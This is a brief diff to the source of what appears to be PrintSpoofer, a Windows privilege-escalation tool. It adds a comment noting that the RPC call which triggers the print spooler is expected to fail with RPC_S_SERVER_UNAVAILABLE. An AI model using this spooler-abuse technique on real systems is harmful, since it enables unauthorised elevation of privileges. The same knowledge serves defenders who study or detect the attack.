@@ -221,6 +221,7 @@ namespace PrintSpoofer.Library
                 {
                     Console.WriteLine("[+] Print spooler is triggered successfully.");
 
+                    // This call returns RPC_S_SERVER_UNAVAILABLE. It's expected.
                     rpc.RpcRemoteFindFirstPrinterChangeNotificationEx(
                         hPrinter,
                         PRINTER_CHANGE_FLAGS.ADD_JOB,
